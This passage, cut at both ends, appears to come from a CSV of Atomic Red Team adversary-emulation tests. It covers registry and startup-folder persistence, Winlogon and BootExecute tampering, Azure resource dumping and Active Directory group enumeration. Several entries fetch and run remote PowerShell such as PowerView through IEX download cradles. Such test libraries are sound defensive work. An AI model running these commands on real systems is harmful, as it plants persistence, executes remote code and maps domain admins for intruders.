dependencies.3.prereq_command: stat ""$PathToAtomicsFolder/T1485/src/T1485-4/terraform.tfstate""

dependencies.3.get_prereq_command: cd ""$PathToAtomicsFolder/T1485/src/T1485-4/""
terraform init
terraform apply -auto-approve
","input_arguments.project_id.description: ID of the GCP Project you to execute the command against.

input_arguments.project_id.type: string

input_arguments.project_id.default: atomic-test-1

input_arguments.bucket_name.description: The name of the bucket to delete.

input_arguments.bucket_name.type: string

input_arguments.bucket_name.default: atomic-red-team-bucket

"
T1547.001,Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder,Reg Key Run,e55be3fd-3521-4610-9d1a-e210e42dcf05,"Run Key Persistence

Upon successful execution, cmd.exe will modify the registry by adding \""Atomic Red Team\"" to the Run key. Output will be via stdout. 
",windows,,,"REG ADD ""HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" /V ""Atomic Red Team"" /t REG_SZ /F /D ""#{command_to_execute}""
",command_prompt,,,"REG DELETE ""HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" /V ""Atomic Red Team"" /f >nul 2>&1
",,,"input_arguments.command_to_execute.description: Thing to Run

input_arguments.command_to_execute.type: path

input_arguments.command_to_execute.default: C:\Path\AtomicRedTeam.exe

"
T1547.001,Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder,Reg Key RunOnce,554cbd88-cde1-4b56-8168-0be552eed9eb,"RunOnce Key Persistence.

Upon successful execution, cmd.exe will modify the registry to load AtomicRedTeam.dll to RunOnceEx. Output will be via stdout. 
",windows,,,"REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d ""#{thing_to_execute}""
",command_prompt,True,,"REG DELETE HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /f >nul 2>&1
",,,"input_arguments.thing_to_execute.description: Thing to Run

input_arguments.thing_to_execute.type: path

input_arguments.thing_to_execute.default: C:\Path\AtomicRedTeam.dll

"
T1547.001,Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder,PowerShell Registry RunOnce,eb44f842-0457-4ddc-9b92-c4caa144ac42,"RunOnce Key Persistence via PowerShell
Upon successful execution, a new entry will be added to the runonce item in the registry.
",windows,,,"$RunOnceKey = ""#{reg_key_path}""
set-itemproperty $RunOnceKey ""NextRun"" '#{thing_to_execute} ""IEX (New-Object Net.WebClient).DownloadString(`""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat`"")""'
",powershell,True,,"Remove-ItemProperty -Path #{reg_key_path} -Name ""NextRun"" -Force -ErrorAction Ignore
",,,"input_arguments.thing_to_execute.description: Thing to Run

input_arguments.thing_to_execute.type: path

input_arguments.thing_to_execute.default: powershell.exe

input_arguments.reg_key_path.description: Path to registry key to update

input_arguments.reg_key_path.type: path

input_arguments.reg_key_path.default: HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce

"
T1547.001,Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder,Suspicious vbs file run from startup Folder,2cb98256-625e-4da9-9d44-f2e5f90b8bd5,"vbs files can be placed in and ran from the startup folder to maintain persistance. Upon execution, ""T1547.001 Hello, World VBS!"" will be displayed twice. 
Additionally, the new files can be viewed in the ""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup""
folder and will also run when the computer is restarted and the user logs in.
",windows,,,"Copy-Item ""$PathToAtomicsFolder\T1547.001\src\vbsstartup.vbs"" ""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs""
Copy-Item ""$PathToAtomicsFolder\T1547.001\src\vbsstartup.vbs"" ""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs""
cscript.exe ""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs""
cscript.exe ""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs""
",powershell,True,,"Remove-Item ""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs"" -ErrorAction Ignore
Remove-Item ""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs"" -ErrorAction Ignore
",,,
T1547.001,Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder,Suspicious jse file run from startup Folder,dade9447-791e-4c8f-b04b-3a35855dfa06,"jse files can be placed in and ran from the startup folder to maintain persistance.
Upon execution, ""T1547.001 Hello, World JSE!"" will be displayed twice. 
Additionally, the new files can be viewed in the ""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup""
folder and will also run when the computer is restarted and the user logs in.
",windows,,,"Copy-Item ""$PathToAtomicsFolder\T1547.001\src\jsestartup.jse"" ""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse""
Copy-Item ""$PathToAtomicsFolder\T1547.001\src\jsestartup.jse"" ""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse""
cscript.exe /E:Jscript ""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse""
cscript.exe /E:Jscript ""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse""
",powershell,True,,"Remove-Item ""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse"" -ErrorAction Ignore
Remove-Item ""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse"" -ErrorAction Ignore
",,,
T1547.001,Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder,Suspicious bat file run from startup Folder,5b6768e4-44d2-44f0-89da-a01d1430fd5e,"bat files can be placed in and executed from the startup folder to maintain persistance

Upon execution, cmd will be run and immediately closed. Additionally, the new files can be viewed in the ""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup""
folder and will also run when the computer is restarted and the user logs in.
",windows,,,"Copy-Item ""$PathToAtomicsFolder\T1547.001\src\batstartup.bat"" ""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat""
Copy-Item ""$PathToAtomicsFolder\T1547.001\src\batstartup.bat"" ""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat""
Start-Process ""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat""
Start-Process ""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat""
",powershell,True,,"Remove-Item ""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat"" -ErrorAction Ignore
Remove-Item ""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat"" -ErrorAction Ignore
",,,
T1547.001,Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder,Add Executable Shortcut Link to User Startup Folder,24e55612-85f6-4bd6-ae74-a73d02e3441d,Adds a non-malicious executable shortcut link to the current users startup directory. Test can be verified by going to the users startup directory and checking if the shortcut link exists. ,windows,,,"$Target = ""C:\Windows\System32\calc.exe""
$ShortcutLocation = ""$home\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\calc_exe.lnk""
$WScriptShell = New-Object -ComObject WScript.Shell
$Create = $WScriptShell.CreateShortcut($ShortcutLocation)
$Create.TargetPath = $Target
$Create.Save()      ",powershell,True,,"Remove-Item ""$home\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\calc_exe.lnk"" -ErrorAction Ignore",,,
T1547.001,Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder,Add persistance via Recycle bin,bda6a3d6-7aa7-4e89-908b-306772e9662f,"Add a persistance via Recycle bin [vxunderground](https://github.com/vxunderground/VXUG-Papers/blob/main/The%20Persistence%20Series/Persistence%20via%20Recycle%20Bin/Persistence_via_Recycle_Bin.pdf)
User have to clic on the recycle bin to lauch the payload (here calc)
",windows,,,"reg ADD ""HKCR\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shell\open\command"" /ve /d ""calc.exe"" /f",command_prompt,,,"reg DELETE ""HKCR\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shell\open"" /f",,,
T1547.001,Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder,SystemBC Malware-as-a-Service Registry,9dc7767b-30c1-4cc4-b999-50cab5e27891,"This Atomic will create a registry key called socks5_powershell for persistance access
https://medium.com/walmartglobaltech/systembc-powershell-version-68c9aad0f85c
",windows,,,"$RunKey = ""#{reg_key_path}""
Set-ItemProperty -Path $RunKey -Name ""socks5_powershell"" -Value ""#{reg_key_value}""
",powershell,,,"Remove-ItemProperty -Path #{reg_key_path} -Name ""socks5_powershell"" -Force -ErrorAction Ignore
",,,"input_arguments.reg_key_value.description: Thing to Run

input_arguments.reg_key_value.type: path

input_arguments.reg_key_value.default: powershell.exe -windowstyle hidden -ExecutionPolicy Bypass -File

input_arguments.reg_key_path.description: Path to registry key to update

input_arguments.reg_key_path.type: path

input_arguments.reg_key_path.default: HKCU:\Software\Microsoft\Windows\CurrentVersion\Run

"
T1547.001,Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder,Change Startup Folder - HKLM Modify User Shell Folders Common Startup Value,acfef903-7662-447e-a391-9c91c2f00f7b,"This test will modify the HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders -V ""Common Startup"" 
value to point to a new startup folder where a payload could be stored to launch at boot.  *successful execution requires system restart
",windows,,,"New-Item -ItemType Directory -path ""#{new_startup_folder}""
Copy-Item -path ""#{payload}"" -destination ""#{new_startup_folder}""
Set-ItemProperty -Path  ""HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders"" -Name ""Common Startup"" -Value ""#{new_startup_folder}""
",powershell,True,,"Set-ItemProperty -Path  ""HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders"" -Name ""Common Startup"" -Value ""%ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup""
Remove-Item ""#{new_startup_folder}"" -Recurse -Force
",,,"input_arguments.new_startup_folder.description: new startup folder to replace standard one

input_arguments.new_startup_folder.type: string

input_arguments.new_startup_folder.default: $env:TMP\atomictest\

input_arguments.payload.description: executable to be placed in new startup location 

input_arguments.payload.type: string

input_arguments.payload.default: C:\Windows\System32\calc.exe

"
T1547.001,Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder,Change Startup Folder - HKCU Modify User Shell Folders Startup Value,8834b65a-f808-4ece-ad7e-2acdf647aafa,"This test will modify the HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders  -V ""Startup"" value 
to point to a new startup folder where a payload could be stored to launch at boot.  *successful execution requires system restart
",windows,,,"New-Item -ItemType Directory -path ""#{new_startup_folder}""
Copy-Item -path ""#{payload}"" -destination ""#{new_startup_folder}""
Set-ItemProperty -Path  ""HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders"" -Name ""Startup"" -Value ""#{new_startup_folder}""
",powershell,,,"Set-ItemProperty -Path  ""HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders"" -Name ""Startup"" -Value ""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup""
Remove-Item ""#{new_startup_folder}"" -Recurse -Force
",,,"input_arguments.new_startup_folder.description: new startup folder to replace standard one

input_arguments.new_startup_folder.type: string

input_arguments.new_startup_folder.default: $env:TMP\atomictest\

input_arguments.payload.description: executable to be placed in new startup location 

input_arguments.payload.type: string

input_arguments.payload.default: C:\Windows\System32\calc.exe

"
T1547.001,Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder,HKCU - Policy Settings Explorer Run Key,a70faea1-e206-4f6f-8d9a-67379be8f6f1,"This test will create a new value under HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run to launch calc.exe on boot. 
*Requires reboot
",windows,,,"if (!(Test-Path -Path ""HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"")){
  New-Item -ItemType Key -Path  ""HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run""
}
Set-ItemProperty -Path  ""HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"" -Name ""#{target_key_value_name}"" -Value ""#{payload}""
",powershell,True,,"Remove-ItemProperty -Path  ""HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"" -Name ""#{target_key_value_name}""",,,"input_arguments.target_key_value_name.description: registry value to crate on target key

input_arguments.target_key_value_name.type: string

input_arguments.target_key_value_name.default: atomictest

input_arguments.payload.description: payload to execute

input_arguments.payload.type: string

input_arguments.payload.default: C:\Windows\System32\calc.exe

"
T1547.001,Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder,HKLM - Policy Settings Explorer Run Key,b5c9a9bc-dda3-4ea0-b16a-add8e81ab75f,"This test will create a HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run key value to launch calc.exe on boot. 
*Requires reboot
",windows,,,"if (!(Test-Path -Path ""HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"")){
  New-Item -ItemType Key -Path  ""HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run""
}
Set-ItemProperty -Path  ""HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"" -Name ""#{target_key_value_name}"" -Value ""#{payload}""
",powershell,True,,"Remove-ItemProperty -Path  ""HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"" -Name ""#{target_key_value_name}""",,,"input_arguments.target_key_value_name.description: registry value to crate on target key

input_arguments.target_key_value_name.type: string

input_arguments.target_key_value_name.default: atomictest

input_arguments.payload.description: payload to execute

input_arguments.payload.type: string

input_arguments.payload.default: C:\Windows\System32\calc.exe

"
T1547.001,Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder,HKLM - Append Command to Winlogon Userinit KEY Value,f7fab6cc-8ece-4ca7-a0f1-30a22fccd374,"This test will append a command to the  HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit value to launch calc.exe on boot.
* Requires reboot
",windows,,,"$oldvalue = $(Get-ItemPropertyValue -Path  ""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"" -Name ""Userinit"");
Set-ItemProperty -Path ""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"" -Name ""Userinit-backup"" -Value ""$oldvalue"";
$newvalue = $oldvalue + "" #{payload}"";
Set-ItemProperty -Path  ""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"" -Name ""Userinit"" -Value ""$newvalue""
",powershell,True,,"$oldvalue = $(Get-ItemPropertyValue -Path  ""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"" -Name 'Userinit-backup');
Set-ItemProperty -Path ""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"" -Name ""Userinit"" -Value ""$oldvalue"";
Remove-ItemProperty -Path  ""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"" -Name 'Userinit-backup'",,,"input_arguments.payload.description: what to run

input_arguments.payload.type: string

input_arguments.payload.default: C:\Windows\System32\calc.exe

"
T1547.001,Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder,HKLM - Modify default System Shell - Winlogon Shell KEY Value ,1d958c61-09c6-4d9e-b26b-4130314e520e,"This test change the default value of HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell from ""explorer.exe"" to the full path of ""C:\Windows\explorer.exe"" 
to log a change to the key's default value without breaking boot sequence. 
An atacker will alternatively replace this with a custom shell. 
",windows,,,"$oldvalue = $(Get-ItemPropertyValue -Path  ""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"" -Name ""Shell"");
Set-ItemProperty -Path ""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"" -Name ""Shell-backup"" -Value ""$oldvalue"";
$newvalue = $oldvalue + "", #{payload}"";
Set-ItemProperty -Path  ""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"" -Name ""Shell"" -Value ""$newvalue""
",powershell,True,,"$oldvalue = $(Get-ItemPropertyValue -Path  ""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"" -Name 'Shell-backup');
Set-ItemProperty -Path ""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"" -Name ""Shell"" -Value ""$oldvalue"";
Remove-ItemProperty -Path  ""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"" -Name 'Shell-backup'",,,"input_arguments.payload.description: what to run

input_arguments.payload.type: string

input_arguments.payload.default: C:\Windows\explorer.exe

"
T1547.001,Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder,secedit used to create a Run key in the HKLM Hive,14fdc3f1-6fc3-4556-8d36-aa89d9d42d02,"secedit allows to manipulate the HKLM hive of the Windows registry. This test creates a Run key with the keyname calc having calc.exe as the value in the HKLM hive.
[Reference](https://blueteamops.medium.com/secedit-and-i-know-it-595056dee53d)
",windows,,,"secedit /import /db #{secedit_db} /cfg ""#{ini_file}""
secedit /configure /db #{secedit_db}
",command_prompt,True,,"REG DELETE ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" /V ""calc"" /f >nul 2>&1",,,"input_arguments.ini_file.description: INI config template

input_arguments.ini_file.type: string

input_arguments.ini_file.default: $PathToAtomicsFolder\T1547.001\src\regtemplate.ini

input_arguments.secedit_db.description: Custom secedit db

input_arguments.secedit_db.type: string

input_arguments.secedit_db.default: mytemplate.db

"
T1547.001,Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder,Modify BootExecute Value,befc2b40-d487-4a5a-8813-c11085fb5672,"This test modifies the BootExecute registry value to ""autocheck autoche *"", which can be used to simulate an adversary's attempt to tamper with the system's boot process. 
Reference - https://www.welivesecurity.com/wp-content/uploads/2018/09/ESET-LoJax.pdf
NOTE that by not saving the correct value, you may inhibit your system from booting properly. Only run on a test system. There is a reg export before running the Atomic.
",windows,,,"if (!(Test-Path ""$PathToAtomicsFolder\T1547.001\src\SessionManagerBackup.reg"")) { reg.exe export ""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager"" ""$PathToAtomicsFolder\T1547.001\src\SessionManagerBackup.reg"" /y }
Set-ItemProperty -Path ""HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager"" -Name ""BootExecute"" -Value ""#{registry_value}"" -Type MultiString
",powershell,True,,"reg.exe import ""$PathToAtomicsFolder\T1547.001\src\SessionManagerBackup.reg""
Remove-Item -Path ""$PathToAtomicsFolder\T1547.001\src\SessionManagerBackup.reg"" -Force
",,,"input_arguments.registry_value.description: Registry value to set

input_arguments.registry_value.type: string

input_arguments.registry_value.default: autocheck autoche *

"
T1547.015,Boot or Logon Autostart Execution: Login Items,Persistence by modifying Windows Terminal profile,ec5d76ef-82fe-48da-b931-bdb25a62bc65,Modify Windows Terminal settings.json file to gain persistence. [Twitter Post](https://twitter.com/nas_bench/status/1550836225652686848),windows,,,"mv #{settings_json_def} #{settings_json_tmp}
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.015/src/settings.json?raw=true"" -OutFile ""#{settings_json_def}""
wt.exe
",powershell,,,"mv -Force #{settings_json_tmp} #{settings_json_def}
taskkill /F /IM ""#{calculator}"" > $null
",powershell,"dependencies.0.description: Windows Terminal must be installed

dependencies.0.prereq_command: if (Test-Path #{wt_exe}) {exit 0} else {exit 1}

dependencies.0.get_prereq_command: $(rm ~\AppData\Local\Packages\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\LocalState\StoreEdgeFD\installed.db -ErrorAction Ignore; Write-Output """"; $?) -and $(winget install --id=Microsoft.WindowsTerminal)

","input_arguments.calculator.description: Test program used to imitate a maliciously called program.

input_arguments.calculator.type: string

input_arguments.calculator.default: calculator.exe

input_arguments.settings_json_def.description: Default file for Windows Terminal to replace the default profile with a backdoor to call another program.

input_arguments.settings_json_def.type: path

input_arguments.settings_json_def.default: ~\AppData\Local\Packages\Microsoft.WindowsTerminal_8wekyb3d8bbwe\LocalState\settings.json

input_arguments.settings_json_tmp.description: Temp file for Windows Terminal.

input_arguments.settings_json_tmp.type: path

input_arguments.settings_json_tmp.default: ~\AppData\Local\Temp\settings.json

input_arguments.wt_exe.description: Windows Terminal executable.

input_arguments.wt_exe.type: path

input_arguments.wt_exe.default: ~\AppData\Local\Microsoft\WindowsApps\Microsoft.WindowsTerminal_8wekyb3d8bbwe\wt.exe

"
T1547.015,Boot or Logon Autostart Execution: Login Items,Add macOS LoginItem using Applescript,716e756a-607b-41f3-8204-b214baf37c1d,"Runs osascript on a file to create new LoginItem for current user.
NOTE: Will popup dialog prompting user to Allow or Deny Terminal.app to control ""System Events""
Therefore, it can't be automated until the TCC is granted.
The login item launches Safari.app when user logs in, but there is a cleanup script to remove it as well.
In addition to the `osascript` Process Events, file modification events to
`/Users/*/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm` should be seen.
",macos,,,"osascript #{scriptfile}
",bash,,,"osascript #{cleanup_script}
",,,"input_arguments.scriptfile.description: path to Applescript source to add Safari LoginItem.

input_arguments.scriptfile.type: string

input_arguments.scriptfile.default: PathToAtomicsFolder/T1547.015/src/add_login_item.osa

input_arguments.cleanup_script.description: path to Applescript source to delete Safari LoginItem.

input_arguments.cleanup_script.type: string

input_arguments.cleanup_script.default: PathToAtomicsFolder/T1547.015/src/remove_login_item.osa

"
T1526,Cloud Service Discovery,Azure - Dump Subscription Data with MicroBurst,1e40bb1d-195e-401e-a86b-c192f55e005c,"Upon successful execution, this test will enumerate all resources that are contained within a valid Azure subscription. 
The resources enumerated will display on screen, as well as several csv files and folders will be output to a specified directory, listing what resources were discovered by the script. 
See https://dev.to/cheahengsoon/enumerating-subscription-information-with-microburst-35a1
",iaas:azure,,,"import-module ""PathToAtomicsFolder\..\ExternalPayloads\Get-AzDomainInfo.ps1""
$Password = ConvertTo-SecureString -String ""#{password}"" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ""#{username}"", $Password
Connect-AzAccount -Credential $Credential | out-null
Get-AzDomainInfo -folder #{output_directory} -subscription ""#{subscription_name}"" -verbose
",powershell,,,"remove-item #{output_directory} -recurse -force -erroraction silentlycontinue
",powershell,"dependencies.0.description: The Get-AzDomainInfo script must exist in PathToAtomicsFolder\..\ExternalPayloads.

dependencies.0.prereq_command: if (test-path ""PathToAtomicsFolder\..\ExternalPayloads\Get-AzDomainInfo.ps1""){exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
invoke-webrequest ""https://raw.githubusercontent.com/NetSPI/MicroBurst/c771c665a2c71f9c5ba474869cd1c211ebee68fd/Az/Get-AzDomainInfo.ps1"" -outfile ""PathToAtomicsFolder\..\ExternalPayloads\Get-AzDomainInfo.ps1""

dependencies.1.description: The Az module must be installed.

dependencies.1.prereq_command: try {if (Get-InstalledModule -Name Az -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}

dependencies.1.get_prereq_command: Install-Module -Name Az -Force

","input_arguments.username.description: Azure AD username

input_arguments.username.type: string

input_arguments.username.default: None

input_arguments.password.description: Azure AD password

input_arguments.password.type: string

input_arguments.password.default: T1082Az

input_arguments.output_directory.description: Directory to output results to

input_arguments.output_directory.type: string

input_arguments.output_directory.default: $env:temp\T1526Test1

input_arguments.subscription_name.description: Azure subscription name to scan

input_arguments.subscription_name.type: string

input_arguments.subscription_name.default: None

"
T1069.002,Permission Groups Discovery: Domain Groups,Basic Permission Groups Discovery Windows (Domain),dd66d77d-8998-48c0-8024-df263dc2ce5d,"Basic Permission Groups Discovery for Windows. This test will display some errors if run on a computer not connected to a domain. Upon execution, domain
information will be displayed.
",windows,,,"net localgroup
net group /domain
net group ""enterprise admins"" /domain
net group ""domain admins"" /domain
",command_prompt,,,,,,
T1069.002,Permission Groups Discovery: Domain Groups,Permission Groups Discovery PowerShell (Domain),6d5d8c96-3d2a-4da9-9d6d-9a9d341899a7,"Permission Groups Discovery utilizing PowerShell. This test will display some errors if run on a computer not connected to a domain. Upon execution, domain
information will be displayed.
",windows,,,"get-ADPrincipalGroupMembership #{user} | select name
",powershell,,,,,,"input_arguments.user.description: User to identify what groups a user is a member of

input_arguments.user.type: string

input_arguments.user.default: $env:USERNAME

"
T1069.002,Permission Groups Discovery: Domain Groups,Elevated group enumeration using net group (Domain),0afb5163-8181-432e-9405-4322710c0c37,"Runs ""net group"" command including command aliases and loose typing to simulate enumeration/discovery of high value domain groups. This
test will display some errors if run on a computer not connected to a domain. Upon execution, domain information will be displayed.
",windows,,,"net groups ""Account Operators"" /doma
net groups ""Exchange Organization Management"" /doma
net group ""BUILTIN\Backup Operators"" /doma
net group /domai ""Domain Admins""
",command_prompt,,,,,,
T1069.002,Permission Groups Discovery: Domain Groups,Find machines where user has local admin access (PowerView),a2d71eee-a353-4232-9f86-54f4288dd8c1,"Find machines where user has local admin access (PowerView). Upon execution, progress and info about each host in the domain being scanned will be displayed.
",windows,,,"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-LocalAdminAccess -Verbose
",powershell,,,,,,
T1069.002,Permission Groups Discovery: Domain Groups,Find local admins on all machines in domain (PowerView),a5f0d9f8-d3c9-46c0-8378-846ddd6b1cbd,"Enumerates members of the local Administrators groups across all machines in the domain. Upon execution, information about each machine will be displayed.
",windows,,,"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Invoke-EnumerateLocalAdmin  -Verbose
",powershell,,,,,,
T1069.002,Permission Groups Discovery: Domain Groups,Find Local Admins via Group Policy (PowerView),64fdb43b-5259-467a-b000-1b02c00e510a,"takes a computer and determines who has admin rights over it through GPO enumeration. Upon execution, information about the machine will be displayed.
",windows,,,"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-GPOComputerAdmin -ComputerName #{computer_name} -Verbose
",powershell,,,,,,"input_arguments.computer_name.description: hostname of the computer to analyze

input_arguments.computer_name.type: path

input_arguments.computer_name.default: $env:COMPUTERNAME

"
T1069.002,Permission Groups Discovery: Domain Groups,Enumerate Users Not Requiring Pre Auth (ASRepRoast),870ba71e-6858-4f6d-895c-bb6237f6121b,"When successful, accounts that do not require kerberos pre-auth will be returned
",windows,,,"get-aduser -f * -pr DoesNotRequirePreAuth | where {$_.DoesNotRequirePreAuth -eq $TRUE}
",powershell,False,,,powershell,"dependencies.0.description: Computer must be domain joined.

dependencies.0.prereq_command: if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}

dependencies.0.get_prereq_command: Write-Host Joining this computer to a domain must be done manually.

dependencies.1.description: Requires the Active Directory module for powershell to be installed.

dependencies.1.prereq_command: if(Get-Module -ListAvailable -Name ActiveDirectory) {exit 0} else {exit 1}

dependencies.1.get_prereq_command: Add-WindowsCapability -Online -Name ""Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0""

",
T1069.002,Permission Groups Discovery: Domain Groups,Adfind - Query Active Directory Groups,48ddc687-82af-40b7-8472-ff1e742e8274,"Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Groups
reference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html
",windows,,,"""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" -f (objectcategory=group) #{optional_args}
",command_prompt,,,,powershell,"dependencies.0.description: AdFind.exe must exist on disk at specified location (PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe)

dependencies.0.prereq_command: if (Test-Path ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
New-Item -Type Directory (split-path ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"") -ErrorAction ignore | Out-Null
Invoke-WebRequest -Uri ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/bin/AdFind.exe"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe""

","input_arguments.optional_args.description: Allows defining arguments to add to the adfind command to tailor it to the specific needs of the environment. Use ""-arg"" notation to add arguments separated by spaces.

input_arguments.optional_args.type: string

input_arguments.optional_args.default: None

"
T1069.002,Permission Groups Discovery: Domain Groups,Enumerate Active Directory Groups with Get-AdGroup,3d1fcd2a-e51c-4cbe-8d84-9a843bad8dc8,"The following Atomic test will utilize Get-AdGroup to enumerate groups within Active Directory.
Upon successful execution a listing of groups will output with their paths in AD.
Reference: https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-adgroup?view=windowsserver2022-ps
